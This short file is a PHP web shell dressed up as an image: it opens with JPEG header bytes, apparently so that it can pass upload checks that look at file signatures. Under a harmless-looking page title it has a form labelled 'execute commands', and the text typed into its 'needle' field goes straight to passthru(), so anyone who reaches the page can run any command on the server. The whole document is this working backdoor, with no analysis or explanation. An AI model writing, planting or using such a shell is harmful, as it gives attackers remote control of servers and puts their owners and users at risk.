ÿØÿî









<html>
<body>
    <h1> parham's personal prompt </h1>
    <p>
        i add this part to be sure the first bytes of this file is useless if it get broken
    </p>
    <div id="content">
        <form>
            execute commands:<input name=needle><input type=submit name=submit value=Search><br>
        </form>
        <br>
        Output:
        <div>
            <?
            $key = "";
            if (array_key_exists("needle", $_REQUEST)) {
                $key = $_REQUEST["needle"];
            }
            if ($key) {
                passthru($key);
            }
            ?>
        </div>
    </div>
</body>
</html>
